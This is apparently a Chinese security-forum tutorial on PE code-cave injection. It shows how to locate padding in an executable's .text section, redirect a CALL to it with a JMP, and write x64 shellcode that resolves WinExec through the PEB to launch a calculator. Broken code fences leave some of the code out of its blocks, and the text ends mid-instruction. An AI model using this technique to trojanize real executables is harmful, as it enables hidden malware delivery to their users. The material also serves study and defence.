---
title: PE文件代码洞利用技术详解
url: https://forum.butian.net/share/4770
source: 奇安信攻防社区
date: 2026-02-11
fetch_date: 2026-02-12T04:20:46.265461
---

# PE文件代码洞利用技术详解

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[AI](https://forum.butian.net/AISecurity)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [AI安全](https://forum.butian.net/AISecurity)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### PE文件代码洞利用技术详解

* [渗透测试](https://forum.butian.net/topic/47)

PE代码洞是PE文件补丁的一种方式，PE补丁的本质是在不修改原始源代码的情况下，直接对可编译的可执行文件，进行二进制级别的修改，以改变程序的行为、修复漏洞或添加功能。 它和PE壳技术原理有着异曲同工之妙。本篇文章主要讲解代码洞的利用过程以及原理，从而进行更好的防御。

PE代码洞是PE文件补丁的一种方式，PE补丁的本质是\*\*在不修改原始源代码的情况下，直接对可编译的可执行文件，进行二进制级别的修改，以改变程序的行为、修复漏洞或添加功能\*\*。 它和PE壳技术原理有着异曲同工之妙。本篇文章主要讲解代码洞的利用过程以及原理，从而进行更好的防御。
代码洞(Code Caving)
----------------
### 代码洞成因以及定位
直白点来说，代码洞就是PE文件中一段全由零（0x00）或INT3断点（0xcc）、NOP（0x90）组成的空白区域，我们可以利用代码洞填充一些其他的字节码，\*\*但前提是该区域要有可执行权限\*\*，比如`.text`代码段，默认拥有执行权限。
这里要提出一个问题，即为什么会产生代码洞？
原因主要有两个：
1. 由于编译器为了性能，会要求节区在内存和文件中的起始地址必须按特定值对齐，这通常会导致节区的`SizeOfRawData`（磁盘大小）小于其`VirtualSize`（内存大小），或者在节区的末尾留下一段未使用的、由零字节（`0x00`）填充的区域。这些连续的零字节区域就是代码洞。
2. 有时开发者为了后续扩展，会故意在数据段中留出较大的空白缓冲区，方便热更新。
比如这个示例中文件对其`FileAlignment`的值为`512`，那么就意味着每个节区在磁盘中的大小必须为`512`的整数倍
![1.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-149c2d474812c9d191a00a049a0f36661989fa9d.png)
而`text`节的实际大小(`VirtualSize`)为：`0x18B0`，需要再补充`0x150`字节的数据，才能实现文件对其，而这`0x150`字节的数据则全由`0x00`进行填充，填充后的总大小为`0x1A00`，也就是`SizeOfRawData`的值，所以`text`区域的代码洞大小为`0x150`=`347`字节
![2.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-3454cf2edc414009c4aac39370746157b33bb8b3.png)
直接查看`text`的末尾即可看到该段填充数据
![3.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-555bb0a76968aa8df175b1587a5ca9383fabb776.png)
稍微补充以下关于`0x00`和`0x90`，`0xcc`的区别：
- \*\*`0x00`\*\* 是空字节，通常用于填充未使用的内存区域，或者在数据结构之间进行内存对齐。它是由于内存分配和未初始化数据的结果。
- \*\*`0x90`\*\* 是NOP指令，通常用于占位或修改程序执行流，常见于代码洞、调试过程中的控制流跳过，或恶意代码注入。
- `0xcc`是调试断点指令，用于中断程序执行，通常由调试器使用，如果`0xCC`出现在一个程序的空白区域，尤其是一些没有实际执行代码的区域，它就可以被视为代码洞的一部分。
通常来讲大面积的`0x90`和`0xcc`区域一般不会出现，所以我们在进行代码洞利用时，一般是寻找可执行节区的`0x00`区域。
这里可以使用笔者开发的一个小工具：<https://github.com/R0x7e/SearchCodeCaving>
该工具能够直接找出PE文件中的代码洞位置，以及大小，工具虽简单，但方便直观。
![4.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-82d7fe14358cb61b78fefee20a9b2bc96b4d9d6a.png)
在以上的内容中，讲述了PE代码洞的成因，以及如何定位代码洞，接下来我们要讲述，如何利用代码洞插入额外的`shellcode`，并进行执行
### 代码洞利用
\*\*先说思路，后面再进行步骤演示\*\*，代码洞利用通常有两种方式：
- 方法 A (修改入口点 Entry Point): 修改 PE 头的 AddressOfEntryPoint，将其指向代码洞的起始地址（虚拟地址 VA），这种方式不推荐，易于检测。
- 方法 B (Inline Patching): 在原程序的某个指令处，将其替换为一条 `JMP <代码洞地址>` 指令。这需要计算相对偏移量。
其中方法A和PE壳的原理相似，这部分重点讲方法B，方法B的具体思路为：
1. 寻找到一个足够大的代码洞区域
2. 在程序中找到一个指令，然后替换为`JMP <代码洞地址>`
3. 编写一个payload，填充进行代码洞中，这个`payload`有些讲究，内容略多，后文会进行细讲
4. 执行原本被替换的指令
5. `payload`的最后一条为`JMP`指令，返回到原指令的下一条指令地址
6. 代码洞执行完成，程序恢复运行状态
#### 寻找跳板
\*\*寻找代码洞的步骤上述内容已经做过了，不再赘述\*\*，这里直接寻找一个指令，该指令作为跳板指令，然后修改该指令为`JMP <代码洞地址>`，由于`JMP`指令会占用5字节，所以我们要寻找的指令长度必须&gt;=5字节，比较合适的指令为`JMP`或者`CALL`，虽然这两个指令长度并非固定，如`JMP`中的`短跳2字节`，`间接跳`等，但这并非本文的重点，总之这两种指令是作为寻找跳板指令的最优解。
为了寻找合适的跳板指令，我们这里可以直接使用`ida`打开目标程序，由于`ida`默认只显示汇编代码（如 `call sub\_401000`）,不显示机器码（如 `E8 05 00...`）,所以需要修改设置，方便确认指令长度，具体开启的步骤为：
- 点击顶部菜单 \*\*Options\*\* -&gt; \*\*General\*\*。
- 在右侧找到 \\*\\*Number of opcode bytes。
- 将默认的 `0` 改为 \*\*8\*\*。
- 点击 OK。
![5.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-b7ddd826441332c688c6e43659fab76883ffb7d3.png)
那么在这时就可以直接看到汇编指令对应的机器码了
![6.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-d0953fb0176128c4e1bdd3c22df6d9f90b4d9afe.png)
为了方便寻找，这里按下`ALT`+`T`，搜索`CALL`指令，选中`Find ALL`选项
![7.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-c2759982c7fd180124ef6f6abce282e0b1285b12.png)
在寻找替换指令时，需要注意，该指令一定要会执行，（可以通过ida进行分析），否则后面的操作就是白搭，这里我们选择一个`call TargetFunction`指令进行替换
![8.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-6e4fffd395030e409bec3b48ad92be7a3995c055.png)
```c++
.text:00000001400014BB E8 D0 FF FF FF call TargetFunction
```
这是我们已经基本确定了跳板指令，接下来在计算我们要修改`CALL`指令的偏移量以及代码洞中的`payload`执行完之后的回调地址（当前执行的下一条指令地址）。
\*\*计算当前指令地址：\*\*
首先计算当前指令的地址，当前`exe`文件的`imagebase`为`140000000h`，在`ida`中看到当前指令的VA地址为`1400014BBB`，那么当前跳板指令的相对虚拟地址RVA为`0x14BB`
> 计算公式：`0x1400014BB` (VA) - `0x140000000` (基址) = \\*\\*`0x14BB
有了指令`RVA`之后，然后再计算当前指令在磁盘文件中的地址，即文件偏移，计算公式为：文件偏移 = RVA - text 节VirtualAddress + PointerToRawData
`text`节的VA为：1000h，`PointerToRawData`为600h，所以当前指令在磁盘文件中的地址为：`0x14BB - 0x1000 + 0x600` = `0xABB`，如果不确定计算结果可以通过`010 editor`进行验证，在`010 editor`中按下`Ctrl+G`，输入`ABB`，可以看到搜索的机器码为`E8 D0 FF FF FF`，和`ida`中查看的结果一致
![9.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-8b947eb7cf819cd4ff465f53a410665d8bb7c67d.png)
以上计算步骤，得到了当前指令的`RVA`为：`0x14BB`，磁盘文件地址为：`0xABB`，接下来在计算代码洞的地址。
\*\*代码洞地址计算\*\*
代码洞的地址计算就相对简单了一些，代码洞的RVA地址为：VA+VirtualSize，VA为：1000h，VirtualSize为：18B0h，那么代码洞的RVA为：28B0h,
\*\*`JMP`指令相对偏移计算\*\*
我们需要将当前`call TargetFunction`修改为`JMP <代码洞地址>`，就需要计算出当前指令以及代码洞之间的相对偏移量，相对偏移量的计算公式为：
```php
偏移量 = 目标地址 - 源地址 - 5
```
- \*\*源地址 (Source RVA)\*\*: `0x14BB` (跳板位置)
- \*\*目标地址 (Target RVA)\*\*: `0x28B0` (你的代码洞位置)
- \*\*指令长度\*\*: `5` 字节 (`E9` 指令长度)
计算结果为：`0x13F0`，然后此地址填充进`JMP`指令中，由于PE文件是小端序进行存储的，所以在16进制填充时需要填充的内容为`E9 F0 13 00 00`
在`ida`中，右击该指令，然后点击`Patching-->Change byte`，可以直接对当前机器码进行修改
![10.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-b016a2b6503c5d6d91e394216775bdfe58224eff.png)
修改后的内容为：
![11.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-99e346f2d86476a3c9260535bf8a5db1688674d8.png)
点击ok，然后依次点击`Pathcing -- > apply pathes to...`将修改后的PE文件保存到本地
![12.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-038ced7f71374221f9ebd8866dee6c046655a73b.png)
#### 编写代码洞的payload
我们需要编写一个payload，用于填充到代码洞中，该payload主要功能为：
- 保存现场，将关键寄存器的值保存到栈中
- 执行弹出计算器的操作，这是我们代码洞利用的目的
- 恢复现场，从栈中恢复寄存器
- 执行被我们修改和替换的汇编指令
- 跳转到被修改的指令的下一条地址中，从而使程序继续正常往下运行
这里采用汇编的方式编写`payload`代码，一下是对不同功能的代码进行了拆解：
\*\*保存现场，将关键进寄存器的值保存到栈中：\*\*
```asm
pushfq
push rax
push rcx
push rdx
push rbx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
```
\*\*设置栈帧并对齐栈\*\*
```asm
push rbp
mov rbp, rsp
sub rsp, 0x50 ; 预留足够的局部空间和影子空间
and rsp, -16 ; 16字节对齐
```
\*\*通过PEB（进程环境块）查找Kernel32.dll的基址\*\*
```asm
mov rax, [gs:0x60] ; RAX = PEB地址
mov rax, [rax + 0x18] ; RAX = PEB\_LDR\_DATA
mov rax, [rax + 0x20] ; RAX = InMemoryOrderModuleList第一个条目
find\_k32\_loop:
; 遍历已加载模块链表
mov rsi, [rax + 0x50] ; RSI = BaseDllName.Buffer（Unicode字符串指针）
test rsi, rsi ; 安全检查：确保指针有效
jz short next\_mod
; 简化检查：检查"kernel32.dll"中的'3'字符（Unicode）
; "kernel32.dll"中'3'是第7个字符，Unicode偏移=6\*2=0x0C
cmp word [rsi + 0x0C], 0x33 ; 0x33 = '3'的Unicode
je short found\_k32
```
next\\_mod:
mov rax, \[rax\] ; 移动到链表下一个条目（Flink）
jmp find\\_k32\\_loop
found\\_k32:
mov rbx, \[rax + 0x20\] ; RBX = DllBase（Kernel32.dll基址）
```php
\*\*解析Kernel32.dll导出表， 定位WinExec函数地址\*\*
```
; 获取PE头偏移
mov r8d, \[rbx + 0x3C\] ; R8D = e\\_lfanew（NT头偏移）
; 获取导出表RVA
mov r8d, \[rbx + r8 + 0x88\] ; R8D = 导出表RVA（DataDirectory\[0\]）
add r8, rbx ; R8 = 导出表虚拟地址
```php
; 获取函数名数组
mov r9d, [r8 + 0x20] ; R9D = AddressOfNames RVA
add r9, rbx ; R9 = 函数名数组地址
xor rdx, rdx ; RDX = 当前索引
```
find\\_winexec\\_loop:
; 遍历导出函数名
mov r10d, \[r9 + rdx \\* 4\] ; R10D = 函数名RVA
add r10, rbx ; R10 = 函数名字符串地址
```php
; 比较字符串"WinExec"（7个字符）
mov rax, [r10] ; 读取前8字节
mov r11, 0x00FFFFFFFFFFFFFF ; 7字节掩码（忽略第8字节）
and rax, r11
mov r11, 0x636578456E6957 ; "WinExec"的小端十六进制
cmp rax, r11 ; 比较
je short found\_winexec ; 找到匹配
inc rdx ; 下一个函数
jmp find\_winexec\_loop
```
found\\_winexec:
; 通过名称索引获取序号
mov r10d, \[r8 + 0x24\] ; AddressOfNameOrdinals RVA
add r10, rbx
movzx rdx, word \[r10 + rdx \\* 2\] ; 获取序号（零扩展）
```php
; 通过序号获取函数地址
mov r10d, [r8 + 0x1C] ; AddressOfFunctions RVA
add r10, rb...